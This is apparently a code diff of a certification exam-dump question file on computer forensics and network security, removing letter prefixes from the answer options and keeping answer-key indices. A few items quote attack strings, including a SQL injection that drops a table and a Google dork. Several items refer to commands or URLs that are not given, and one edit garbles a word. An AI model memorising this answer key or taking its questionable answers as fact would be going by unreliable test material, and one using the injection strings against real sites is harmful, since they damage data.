+      "Inform the owner that conducting an investigation without a policy is not a problem because a policy is only necessary for government agencies",
     ],
     correctAnswer: 2,
   },
@@ -7945,10 +7927,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Can an employer file a criminal complaint with police if a corporate investigation reveals an employee is committing a crime?",
     options: [
-      "A. Yes, and all evidence can be turned over to the police",
-      "B. Yes, but only if you turn the evidence over to a federal law enforcement agency",
-      "C. No, because the investigation was conducted without following standard police procedures",
-      "D. No, because the investigation was conducted without warrant",
+      "Yes, and all evidence can be turned over to the police",
+      "Yes, but only if you turn the evidence over to a federal law enforcement agency",
+      "No, because the investigation was conducted without following standard police procedures",
+      "No, because the investigation was conducted without warrant",
     ],
     correctAnswer: 0,
   },
@@ -7957,10 +7939,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "____________________ is simply the application of Computer Investigation and analysis techniques in the interests of determining potential legal evidence.",
     options: [
-      "A. Network Forensics",
-      "B. Computer Forensics",
-      "C. Incident Response",
-      "D. Event Reaction",
+      "Network Forensics",
+      "Computer Forensics",
+      "Incident Response",
+      "Event Reaction",
     ],
     correctAnswer: 1,
   },
@@ -7968,7 +7950,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 886,
     question:
       "What is the name of the standard Linux command, also available as a Windows application, that can be used to create bit-stream images?",
-    options: ["A. mcopy", "B. image", "C. MD5", "D. dd"],
+    options: ["mcopy", "image", "MD5", "dd"],
     correctAnswer: 3,
   },
   {
@@ -7976,10 +7958,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "To preserve digital evidence, an investigator should ____________________",
     options: [
-      "A. Make two copies of each evidence item using a single imaging tool",
-      "B. Make a single copy of each evidence item using an approved imaging tool",
-      "C. Make two copies of each evidence item using different imaging tools",
-      "D. Only store the original evidence item",
+      "Make two copies of each evidence item using a single imaging tool",
+      "Make a single copy of each evidence item using an approved imaging tool",
+      "Make two copies of each evidence item using different imaging tools",
+      "Only store the original evidence item",
     ],
     correctAnswer: 2,
   },
@@ -7988,10 +7970,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Profiling is a forensics technique for analyzing evidence with the goal of identifying the perpetrator from their various activity. After a computer has been compromised by a hacker, which of the following would be most important in forming a profile of the incident?",
     options: [
-      "A. The manufacturer of the system compromised",
-      "B. The logic, formatting and elegance of the code used in the attack",
-      "C. The nature of the attack",
-      "D. The vulnerability exploited in the incident",
+      "The manufacturer of the system compromised",
+      "The logic, formatting and elegance of the code used in the attack",
+      "The nature of the attack",
+      "The vulnerability exploited in the incident",
     ],
     correctAnswer: 1,
   },
@@ -7999,10 +7981,10 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 890,
     question: "An expert witness may give an opinion if:",
     options: [
-      "A. The opinion, inferences or conclusions depend on special knowledge, skill or training not within the ordinary experience of lay jurors",
-      "B. To define the issues of the case for determination by the finder of fact",
-      "C. To stimulate discussion between the consulting expert and the expert witness",
-      "D. To deter the witness from expanding the scope of his or her investigation beyond the requirements of the case",
+      "The opinion, inferences or conclusions depend on special knowledge, skill or training not within the ordinary experience of lay jurors",
+      "To define the issues of the case for determination by the finder of fact",
+      "To stimulate discussion between the consulting expert and the expert witness",
+      "To deter the witness from expanding the scope of his or her investigation beyond the requirements of the case",
     ],
     correctAnswer: 0,
   },
@@ -8011,10 +7993,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "When using Windows acquisition tools to acquire digital evidence, it is important to use a well-tested hardware write-blocking device to:",
     options: [
-      "A. Automate collection from image files",
-      "B. Avoid copying data from the boot partition",
-      "C. Acquire data from host-protected area on a disk",
-      "D. Prevent contamination to the evidence drive",
+      "Automate collection from image files",
+      "Avoid copying data from the boot partition",
+      "Acquire data from host-protected area on a disk",
+      "Prevent contamination to the evidence drive",
     ],
     correctAnswer: 3,
   },
@@ -8023,10 +8005,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Office Documents (Word, Excel and PowerPoint) contain a code that allows tracking the MAC or unique identifier of the machine that created the document. What is that code called?",
     options: [
-      "A. Globally unique ID",
-      "B. Microsoft Virtual Machine Identifier",
-      "C. Personal Application Protocol",
-      "D. Individual ASCII string",
+      "Globally unique ID",
+      "Microsoft Virtual Machine Identifier",
+      "Personal Application Protocol",
+      "Individual ASCII string",
     ],
     correctAnswer: 0,
   },
@@ -8035,10 +8017,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "You have been asked to investigate after a user has reported a threatening e-mail they have received from an external source. Which of the following are you most interested in when trying to trace the source of the message?",
     options: [
-      "A. The X509 Address",
-      "B. The SMTP reply Address",
-      "C. The E-mail Header",
-      "D. The Host Domain Name",
+      "The X509 Address",
+      "The SMTP reply Address",
+      "The E-mail Header",
+      "The Host Domain Name",
     ],
     correctAnswer: 2,
   },
@@ -8047,10 +8029,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "You discover evidence that a subject is embezzling money from the company. The law enforcement officer requests that you put a network sniffer on the subject's computer. Why do you refuse?",
     options: [
-      "A. Violate your contract",
-      "B. Cause network congestion",
-      "C. Make you an agent of law enforcement",
-      "D. Write information to the subject's hard drive",
+      "Violate your contract",
+      "Cause network congestion",
+      "Make you an agent of law enforcement",
+      "Write information to the subject's hard drive",
     ],
     correctAnswer: 2,
   },
@@ -8059,10 +8041,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "A law enforcement officer may only search for and seize criminal evidence with _______________________, which are facts or circumstances that would lead a reasonable person to believe a crime has been committed or is about to be committed, and evidence of the specific crime exists at the place to be searched.",
     options: [
-      "A. Mere Suspicion",
-      "B. A preponderance of the evidence",
-      "C. Probable cause",
-      "D. Beyond a reasonable doubt",
+      "Mere Suspicion",
+      "A preponderance of the evidence",
+      "Probable cause",
+      "Beyond a reasonable doubt",
     ],
     correctAnswer: 2,
   },
@@ -8071,10 +8053,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "The police believe that Mevin Mattew has been obtaining unauthorized access to computers belonging to several companies. What is preventing the police from breaking down the suspect’s door and searching his home and seizing all his computer equipment if they have not yet obtained a warrant?",
     options: [
-      "A. The Fourth Amendment",
-      "B. The USA Patriot Act",
-      "C. The Good Samaritan Laws",
-      "D. The Federal Rules of Evidence",
+      "The Fourth Amendment",
+      "The USA Patriot Act",
+      "The Good Samaritan Laws",
+      "The Federal Rules of Evidence",
     ],
     correctAnswer: 0,
   },
@@ -8082,10 +8064,10 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 898,
     question: "When cataloging digital evidence, the primary goal is to",
     options: [
-      "A. Make bit-stream images of all hard drives",
-      "B. Preserve evidence integrity",
-      "C. Not remove the evidence from the scene",
-      "D. Not allow the computer to be turned off",
+      "Make bit-stream images of all hard drives",
+      "Preserve evidence integrity",
+      "Not remove the evidence from the scene",
+      "Not allow the computer to be turned off",
     ],
     correctAnswer: 1,
   },
@@ -8093,7 +8075,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 899,
     question:
       "You are conducting an investigation involving complex text searches. Which tool allows you to efficiently search for a string within a file on the bitmap image of the target computer?",
-    options: ["A. Stringsearch", "B. grep", "C. dir", "D. vim"],
+    options: ["Stringsearch", "grep", "dir", "vim"],
     correctAnswer: 1,
   },
   {
@@ -8101,10 +8083,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "You become aware that a suspect is using ABC Company as their ISP. What assistance can the ISP provide?",
     options: [
-      "A. The ISP can investigate anyone using their service and can provide you with assistance",
-      "B. The ISP can investigate computer abuse committed by their employees, but must preserve the privacy of their customers and therefore cannot assist you without a warrant",
-      "C. The ISP can't conduct any type of investigations on anyone and therefore can't assist you",
-      "D. ISPs never maintain log files so they would be of no use to your investigation",
+      "The ISP can investigate anyone using their service and can provide you with assistance",
+      "The ISP can investigate computer abuse committed by their employees, but must preserve the privacy of their customers and therefore cannot assist you without a warrant",
+      "The ISP can't conduct any type of investigations on anyone and therefore can't assist you",
+      "ISPs never maintain log files so they would be of no use to your investigation",
     ],
     correctAnswer: 1,
   },
@@ -8113,10 +8095,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "A company’s web address leads to a pornographic site when typed in a browser, but the IP address works normally. What type of attack has likely occurred?",
     options: [
-      "A. ARP Poisoning",
-      "B. DNS Poisoning",
-      "C. HTTP redirect attack",
-      "D. IP Spoofing",
+      "ARP Poisoning",
+      "DNS Poisoning",
+      "HTTP redirect attack",
+      "IP Spoofing",
     ],
     correctAnswer: 1,
   },
@@ -8125,10 +8107,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "A school systems administrator gives you a simple backup copy of a student’s hard drive and requests you investigate for inappropriate images. What type of copy should you request to ensure completeness and admissibility of evidence?",
     options: [
-      "A. Bit-stream Copy",
-      "B. Robust Copy",
-      "C. Full backup Copy",
-      "D. Incremental Backup Copy",
+      "Bit-stream Copy",
+      "Robust Copy",
+      "Full backup Copy",
+      "Incremental Backup Copy",
     ],
     correctAnswer: 0,
   },
@@ -8137,10 +8119,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Law enforcement officers legally search a location and observe unrelated evidence in plain view. What doctrine allows this evidence to be admissible?",
     options: [
-      "A. Plain view doctrine",
-      "B. Corpus delicti",
-      "C. Locard Exchange Principle",
-      "D. Ex Parte Order",
+      "Plain view doctrine",
+      "Corpus delicti",
+      "Locard Exchange Principle",
+      "Ex Parte Order",
     ],
     correctAnswer: 0,
   },
@@ -8148,14 +8130,14 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 905,
     question:
       "Microsoft Outlook maintains email messages in a proprietary format in what type of file?",
-    options: ["A. .email", "B. .mail", "C. .pst", "D. .doc"],
+    options: [".email", ".mail", ".pst", ".doc"],
     correctAnswer: 2,
   },
   {
     id: 906,
     question:
       "The efforts to obtain information before a trial by demanding documents, depositions, interrogatories, and examination of the scene is a description of what legal term?",
-    options: ["A. Detection", "B. Hearsay", "C. Spoliation", "D. Discovery"],
+    options: ["Detection", "Hearsay", "Spoliation", "Discovery"],
     correctAnswer: 3,
   },
   {
@@ -8163,10 +8145,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "The rule of thumb when shutting down a system is to pull the power plug. However, what is a major drawback of this approach?",
     options: [
-      "A. Any data not yet flushed to the system will be lost",
-      "B. All running processes will be lost",
-      "C. The /tmp directory will be flushed",
-      "D. Power interruption will corrupt the pagefile",
+      "Any data not yet flushed to the system will be lost",
+      "All running processes will be lost",
+      "The /tmp directory will be flushed",
+      "Power interruption will corrupt the pagefile",
     ],
     correctAnswer: 0,
   },
@@ -8175,10 +8157,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "You are assisting in an investigation of threatening emails. The complainant gives you printed copies of 27 emails. You inform her that you need access to the __________ to track the emails back to the suspect.",
     options: [
-      "A. Routing Table",
-      "B. Firewall log",
-      "C. Configuration files",
-      "D. Email Header",
+      "Routing Table",
+      "Firewall log",
+      "Configuration files",
+      "Email Header",
     ],
     correctAnswer: 3,
   },
@@ -8187,29 +8169,24 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Hackers can manipulate Windows Registry for various purposes. Which Registry Hive can be used to load an application at startup?",
     options: [
-      "A. HKEY_LOCAL_MACHINE\\hardware\\windows\\start",
-      "B. HKEY_LOCAL_USERS\\Software|Microsoft\\old\\Version\\Load",
-      "C. HKEY_CURRENT_USER\\Microsoft\\Default",
-      "D. HKEY_LOCAL_MACHINE\\Software\\Microsoft\\CurrentVersion\\Run",
+      "HKEY_LOCAL_MACHINE\\hardware\\windows\\start",
+      "HKEY_LOCAL_USERS\\Software|Microsoft\\old\\Version\\Load",
+      "HKEY_CURRENT_USER\\Microsoft\\Default",
+      "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\CurrentVersion\\Run",
     ],
     correctAnswer: 3,
   },
   {
     id: 910,
     question: "Which of the following file systems is used by Mac OS X?",
-    options: ["A. EFS", "B. HFS+", "C. EXT2", "D. NFS"],
+    options: ["EFS", "HFS+", "EXT2", "NFS"],
     correctAnswer: 1,
   },
   {
     id: 911,
     question:
       "When running a vulnerability scan on a network and the IDS cuts off your connection, what type of IDS is being used?",
-    options: [
-      "A. Passive IDS",
-      "B. Active IDS",
-      "C. Progressive IDS",
-      "D. NIPS",
-    ],
+    options: ["Passive IDS", "Active IDS", "Progressive IDS", "NIPS"],
     correctAnswer: 1,
   },
   {
@@ -8217,10 +8194,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Simon, a former employee, tries to run axfr and ixfr commands using DIG. What is he attempting to do?",
     options: [
-      "A. Send DOS commands to crash the DNS servers",
-      "B. Perform DNS poisoning",
-      "C. Perform a zone transfer",
-      "D. Enumerate all the users in the domain",
+      "Send DOS commands to crash the DNS servers",
+      "Perform DNS poisoning",
+      "Perform a zone transfer",
+      "Enumerate all the users in the domain",
     ],
     correctAnswer: 2,
   },
@@ -8229,10 +8206,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What will the following SQL command produce on a website login page? SELECT email, passwd, login_id, full_name FROM members WHERE email = 'someone@somewhere.com'; DROP TABLE members; --",
     options: [
-      "A. Deletes the entire members table",
-      "B. Inserts the email address into the members table",
-      "C. Retrieves the password for the first user in the members table",
-      "D. This command will not produce anything since the syntax is incorrect",
+      "Deletes the entire members table",
+      "Inserts the email address into the members table",
+      "Retrieves the password for the first user in the members table",
+      "This command will not produce anything since the syntax is incorrect",
     ],
     correctAnswer: 0,
   },
@@ -8240,7 +8217,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 914,
     question:
       "You suspect firewall issues are preventing SNMP communication with remote offices. Which ports should be opened? (Select 2)",
-    options: ["A. 162", "B. 161", "C. 163", "D. 160"],
+    options: ["162", "161", "163", "160"],
     correctAnswer: [0, 1],
   },
   {
@@ -8248,10 +8225,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "You test a dynamic web page by inputting JavaScript into a search field and receive a pop-up saying: 'This is a test.' What does this indicate?",
     options: [
-      "A. Your website is vulnerable to CSS",
-      "B. Your website is not vulnerable",
-      "C. Your website is vulnerable to SQL injection",
-      "D. Your website is vulnerable to web bugs",
+      "Your website is vulnerable to CSS",
+      "Your website is not vulnerable",
+      "Your website is vulnerable to SQL injection",
+      "Your website is vulnerable to web bugs",
     ],
     correctAnswer: 0,
   },
@@ -8259,19 +8236,14 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 916,
     question:
       "In IDLE scanning, if an attacker’s computer sends an IPID of 31400 to a zombie computer on an open port, what will be the response?",
-    options: [
-      "A. The zombie will not send a response",
-      "B. 31402",
-      "C. 31399",
-      "D. 31401",
-    ],
+    options: ["The zombie will not send a response", "31402", "31399", "31401"],
     correctAnswer: 3,
   },
   {
     id: 917,
     question:
-      "Michael conducts an XMAS scan using Nmap and most of the ports do not respond. In what state are these ports?",
-    options: ["A. Closed", "B. Open", "C. Stealth", "D. Filtered"],
+      "Michael conducts an XMAS scan using Nmap and most of the ports do not responIn what state are these ports?",
+    options: ["Closed", "Open", "Stealth", "Filtered"],
     correctAnswer: 1,
   },
   {
@@ -8279,10 +8251,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "To comply with DoD policy, which requires allowing only incoming connections initiated internally, which type of firewall should be implemented?",
     options: [
-      "A. Packet filtering firewall",
-      "B. Circuit-level proxy firewall",
-      "C. Application-level proxy firewall",
-      "D. Statefull firewall",
+      "Packet filtering firewall",
+      "Circuit-level proxy firewall",
+      "Application-level proxy firewall",
+      "Statefull firewall",
     ],
     correctAnswer: 3,
   },
@@ -8290,19 +8262,14 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 919,
     question:
       "Jessica wants to scan her network for live hosts using ICMP ECHO Requests. What type of scan is this?",
-    options: [
-      "A. Tracert",
-      "B. Smurf scan",
-      "C. Ping trace",
-      "D. ICMP ping sweep",
-    ],
+    options: ["Tracert", "Smurf scan", "Ping trace", "ICMP ping sweep"],
     correctAnswer: 3,
   },
   {
     id: 920,
     question:
       "You are passively footprinting a law firm's web servers. Which tool would you use?",
-    options: ["A. Ping sweep", "B. Nmap", "C. Netcraft", "D. Dig"],
+    options: ["Ping sweep", "Nmap", "Netcraft", "Dig"],
     correctAnswer: 2,
   },
   {
@@ -8310,10 +8277,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "After accessing a Cisco router's config file via a URL, what vulnerability have you discovered? http://172.168.4.131/level/99/exec/show/config",
     options: [
-      "A. HTTP Configuration Arbitrary Administrative Access Vulnerability",
-      "B. HTML Configuration Arbitrary Administrative Access Vulnerability",
-      "C. Cisco IOS Arbitrary Administrative Access Online Vulnerability",
-      "D. URL Obfuscation Arbitrary Administrative Access Vulnerability",
+      "HTTP Configuration Arbitrary Administrative Access Vulnerability",
+      "HTML Configuration Arbitrary Administrative Access Vulnerability",
+      "Cisco IOS Arbitrary Administrative Access Online Vulnerability",
+      "URL Obfuscation Arbitrary Administrative Access Vulnerability",
     ],
     correctAnswer: 0,
   },
@@ -8322,10 +8289,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What is the command trying to verify? (Note: The actual command is missing but based on context)",
     options: [
-      "A. Verify that UDP port 445 is open for the 192.168.0.0 network",
-      "B. Verify that TCP port 445 is open for the 192.168.0.0 network",
-      "C. Verify that NETBIOS is running for the 192.168.0.0 network",
-      "D. Verify that UDP port 445 is closed for the 192.168.0.0 network",
+      "Verify that UDP port 445 is open for the 192.168.0.0 network",
+      "Verify that TCP port 445 is open for the 192.168.0.0 network",
+      "Verify that NETBIOS is running for the 192.168.0.0 network",
+      "Verify that UDP port 445 is closed for the 192.168.0.0 network",
     ],
     correctAnswer: 0,
   },
@@ -8334,10 +8301,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Why were 14-character passwords cracked so quickly after a Group Policy change?",
     options: [
-      "A. Passwords of 14 characters or less are broken up into two 7-character hashes",
-      "B. A password Group Policy change takes at least 3 weeks to completely replicate throughout a network",
-      "C. Networks using Active Directory never use SAM databases so the SAM database pulled was empty",
-      "D. The passwords that were cracked are local accounts on the Domain Controller",
+      "Passwords of 14 characters or less are broken up into two 7-character hashes",
+      "A password Group Policy change takes at least 3 weeks to completely replicate throughout a network",
+      "Networks using Active Directory never use SAM databases so the SAM database pulled was empty",
+      "The passwords that were cracked are local accounts on the Domain Controller",
     ],
     correctAnswer: 0,
   },
@@ -8345,10 +8312,10 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 924,
     question: "An 'idle' system is also referred to as what?",
     options: [
-      "A. PC not connected to the Internet",
-      "B. Zombie",
-      "C. PC not being used",
-      "D. Bot",
+      "PC not connected to the Internet",
+      "Zombie",
+      "PC not being used",
+      "Bot",
     ],
     correctAnswer: 1,
   },
@@ -8357,10 +8324,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Larry plans to shut down a city's network using BGP devices and zombies. What type of penetration testing is he performing?",
     options: [
-      "A. Router Penetration Testing",
-      "B. DoS Penetration Testing",
-      "C. Firewall Penetration Testing",
-      "D. Internal Penetration Testing",
+      "Router Penetration Testing",
+      "DoS Penetration Testing",
+      "Firewall Penetration Testing",
+      "Internal Penetration Testing",
     ],
     correctAnswer: 1,
   },
@@ -8369,10 +8336,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What can you infer from receiving an error message window after typing a quotation mark (?) in the username field on a website?",
     options: [
-      "A. SQL injection is possible",
-      "B. SQL injection is not possible",
-      "C. The quotation mark (?) is a valid username",
-      "D. The user for line 3306 in the SQL database has a weak password",
+      "SQL injection is possible",
+      "SQL injection is not possible",
+      "The quotation mark (?) is a valid username",
+      "The user for line 3306 in the SQL database has a weak password",
     ],
     correctAnswer: 0,
   },
@@ -8381,10 +8348,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What information will John be able to gather from Hillary's computer by using Lophtcrack program and sending her an email with a malicious link?",
     options: [
-      "A. Hillary network username and password hash",
-      "B. The SID of Hillary network account",
-      "C. The SAM file from Hillary's computer",
-      "D. The network shares that Hillary has permissions",
+      "Hillary network username and password hash",
+      "The SID of Hillary network account",
+      "The SAM file from Hillary's computer",
+      "The network shares that Hillary has permissions",
     ],
     correctAnswer: 0,
   },
@@ -8393,10 +8360,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Why do PDF passwords not offer maximum protection when sending through email?",
     options: [
-      "A. PDF passwords can easily be cracked by software brute force tools",
-      "B. PDF passwords are converted to clear text when sent through E-mail",
-      "C. PDF passwords are not considered safe by Sarbanes-Oxley",
-      "D. When sent through E-mail, PDF passwords are stripped from the document completely",
+      "PDF passwords can easily be cracked by software brute force tools",
+      "PDF passwords are converted to clear text when sent through E-mail",
+      "PDF passwords are not considered safe by Sarbanes-Oxley",
+      "When sent through E-mail, PDF passwords are stripped from the document completely",
     ],
     correctAnswer: 0,
   },
@@ -8405,10 +8372,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What could have prevented the theft of sensitive information from laptops that were stolen from Meyer Electronics Systems?",
     options: [
-      "A. EFS Encryption",
-      "B. DFS Encryption",
-      "C. IPS Encryption",
-      "D. SDW Encryption",
+      "EFS Encryption",
+      "DFS Encryption",
+      "IPS Encryption",
+      "SDW Encryption",
     ],
     correctAnswer: 0,
   },
@@ -8416,7 +8383,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 930,
     question:
       "What networking protocol language should Kimberly learn that routers utilize?",
-    options: ["A. ATM", "B. UDP", "C. BPG", "D. OSPF"],
+    options: ["ATM", "UDP", "BPG", "OSPF"],
     correctAnswer: 3,
   },
   {
@@ -8424,10 +8391,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What IDS feature must George implement to meet the requirement of a 'time-based induction machine' in the state bill?",
     options: [
-      "A. Signature-based anomaly detection",
-      "B. Pattern matching",
-      "C. Real-time anomaly detection",
-      "D. Statistical-based anomaly detection",
+      "Signature-based anomaly detection",
+      "Pattern matching",
+      "Real-time anomaly detection",
+      "Statistical-based anomaly detection",
     ],
     correctAnswer: 2,
   },
@@ -8436,10 +8403,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Why does John not see any of the traffic produced by Firewalk after using a sniffer on a subnet inside his network?",
     options: [
-      "A. Firewalk cannot pass through Cisco firewalls",
-      "B. Firewalk sets all packets with a TTL of zero",
-      "C. Firewalk cannot be detected by network sniffers",
-      "D. Firewalk sets all packets with a TTL of one",
+      "Firewalk cannot pass through Cisco firewalls",
+      "Firewalk sets all packets with a TTL of zero",
+      "Firewalk cannot be detected by network sniffers",
+      "Firewalk sets all packets with a TTL of one",
     ],
     correctAnswer: 3,
   },
@@ -8448,10 +8415,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What countermeasure should George take to prevent DDoS attacks on his network?",
     options: [
-      "A. Enable direct broadcasts",
-      "B. Disable direct broadcasts",
-      "C. Disable BGP",
-      "D. Enable BGP",
+      "Enable direct broadcasts",
+      "Disable direct broadcasts",
+      "Disable BGP",
+      "Enable BGP",
     ],
     correctAnswer: 1,
   },
@@ -8459,24 +8426,24 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 935,
     question: "Why is Nessus not recommended for a stealthy wireless scan?",
     options: [
-      "A. Nessus is too loud",
-      "B. Nessus cannot perform wireless testing",
-      "C. Nessus is not a network scanner",
-      "D. There are no ways of performing a 'stealthy' wireless scan",
+      "Nessus is too loud",
+      "Nessus cannot perform wireless testing",
+      "Nessus is not a network scanner",
+      "There are no ways of performing a 'stealthy' wireless scan",
     ],
     correctAnswer: 0,
   },
   {
     id: 936,
     question: "At what layer of the OSI model do routers function on?",
-    options: ["A. 4", "B. 3", "C. 1", "D. 5"],
+    options: ["4", "3", "1", "5"],
     correctAnswer: 1,
   },
   {
     id: 937,
     question:
       "What organization should Frank submit the log to find out if it is a new vulnerability or not?",
-    options: ["A. APIPA", "B. IANA", "C. CVE", "D. RIPE"],
+    options: ["APIPA", "IANA", "CVE", "RIPE"],
     correctAnswer: 2,
   },
   {
@@ -8484,10 +8451,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What filter should George use in Ethereal to monitor only SFTP traffic to and from his network?",
     options: [
-      "A. src port 23 and dst port 23",
-      "B. udp port 22 and host 172.16.28.1/24",
-      "C. net port 22",
-      "D. src port 22 and dst port 22",
+      "src port 23 and dst port 23",
+      "udp port 22 and host 172.16.28.1/24",
+      "net port 22",
+      "src port 22 and dst port 22",
     ],
     correctAnswer: 3,
   },
@@ -8496,17 +8463,17 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Which feature will you disable to eliminate the ability to enumerate information about your Cisco routers?",
     options: [
-      "A. Border Gateway Protocol",
-      "B. Cisco Discovery Protocol",
-      "C. Broadcast System Protocol",
-      "D. Simple Network Management Protocol",
+      "Border Gateway Protocol",
+      "Cisco Discovery Protocol",
+      "Broadcast System Protocol",
+      "Simple Network Management Protocol",
     ],
     correctAnswer: 1,
   },
   {
     id: 940,
     question: "What is the smallest possible shellcode in Linux?",
-    options: ["A. 24 bytes", "B. 8 bytes", "C. 800 bytes", "D. 80 bytes"],
+    options: ["24 bytes", "8 bytes", "800 bytes", "80 bytes"],
     correctAnswer: 0,
   },
   {
@@ -8514,10 +8481,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What kind of results did Jim receive from his vulnerability analysis when exploits were executed on systems deemed not exploitable?",
     options: [
-      "A. False negatives",
-      "B. False positives",
-      "C. True negatives",
-      "D. True positives",
+      "False negatives",
+      "False positives",
+      "True negatives",
+      "True positives",
     ],
     correctAnswer: 0,
   },
@@ -8526,10 +8493,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Why would you want to initiate a DoS attack on a system you are testing as a penetration tester?",
     options: [
-      "A. Show outdated equipment so it can be replaced",
-      "B. List weak points on their network",
-      "C. Use attack as a launching point to penetrate deeper into the network",
-      "D. Demonstrate that no system can be protected against DoS attacks",
+      "Show outdated equipment so it can be replaced",
+      "List weak points on their network",
+      "Use attack as a launching point to penetrate deeper into the network",
+      "Demonstrate that no system can be protected against DoS attacks",
     ],
     correctAnswer: 1,
   },
@@ -8538,29 +8505,24 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Why are Linux/Unix based computers better to use than Windows computers for idle scanning?",
     options: [
-      "A. Linux/Unix computers are easier to compromise",
-      "B. Linux/Unix computers are constantly talking",
-      "C. Windows computers are constantly talking",
-      "D. Windows computers will not respond to idle scans",
+      "Linux/Unix computers are easier to compromise",
+      "Linux/Unix computers are constantly talking",
+      "Windows computers are constantly talking",
+      "Windows computers will not respond to idle scans",
     ],
     correctAnswer: 2,
   },
   {
     id: 944,
     question: "What operating system would respond to the following command?",
-    options: ["A. Windows 95", "B. FreeBSD", "C. Windows XP", "D. Mac OS X"],
+    options: ["Windows 95", "FreeBSD", "Windows XP", "Mac OS X"],
     correctAnswer: 1,
   },
   {
     id: 945,
     question:
       "What type of attack has the technician performed when they follow employees into restricted areas disguised as an electrician?",
-    options: [
-      "A. Tailgating",
-      "B. Backtrapping",
-      "C. Man trap attack",
-      "D. Fuzzing",
-    ],
+    options: ["Tailgating", "Backtrapping", "Man trap attack", "Fuzzing"],
     correctAnswer: 0,
   },
   {
@@ -8568,10 +8530,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What changes should the client company make based on the screenshot presented by Paulette during the audit?",
     options: [
-      "A. Remove any identifying numbers, names, or version information",
-      "B. The banner should have more detail on the version numbers for the network equipment",
-      "C. The banner should not state 'only authorized IT personnel may proceed'",
-      "D. The banner should include the Cisco tech support contact information as well",
+      "Remove any identifying numbers, names, or version information",
+      "The banner should have more detail on the version numbers for the network equipment",
+      "The banner should not state 'only authorized IT personnel may proceed'",
+      "The banner should include the Cisco tech support contact information as well",
     ],
     correctAnswer: 0,
   },
@@ -8580,10 +8542,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What will the following URL produce in an unpatched IIS Web Server?",
     options: [
-      "A. Directory listing of C: drive on the web server",
-      "B. Insert a Trojan horse into the C: drive of the web server",
-      "C. Execute a buffer flow in the C: drive of the web server",
-      "D. Directory listing of the C:\\windows\\system32 folder on the web server",
+      "Directory listing of C: drive on the web server",
+      "Insert a Trojan horse into the C: drive of the web server",
+      "Execute a buffer flow in the C: drive of the web server",
+      "Directory listing of the C:\\windows\\system32 folder on the web server",
     ],
     correctAnswer: 0,
   },
@@ -8592,10 +8554,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What is kept in the following directory? HKLM\\SECURITY\\Policy\\Secrets",
     options: [
-      "A. Cached password hashes for the past 20 users",
-      "B. Service account passwords in plain text",
-      "C. IAS account names and passwords",
-      "D. Local store PKI Kerberos certificates",
+      "Cached password hashes for the past 20 users",
+      "Service account passwords in plain text",
+      "IAS account names and passwords",
+      "Local store PKI Kerberos certificates",
     ],
     correctAnswer: 1,
   },
@@ -8604,10 +8566,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Where should Harold navigate on the computer to find the backup SAM file after running rdisk /s command?",
     options: [
-      "A. %systemroot%\\system32\\LSA",
-      "B. %systemroot%\\system32\\drivers\\etc",
-      "C. %systemroot%\\repair",
-      "D. %systemroot%\\LSA",
+      "%systemroot%\\system32\\LSA",
+      "%systemroot%\\system32\\drivers\\etc",
+      "%systemroot%\\repair",
+      "%systemroot%\\LSA",
     ],
     correctAnswer: 2,
   },
@@ -8616,10 +8578,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What search string will you use to locate Microsoft Outlook Web Access Default Portal using Google search?",
     options: [
-      'A. allinurl:"exchange/logon.asp"',
-      'B. intitle:"exchange server"',
-      'C. locate:"logon page"',
-      'D. outlook:"search"',
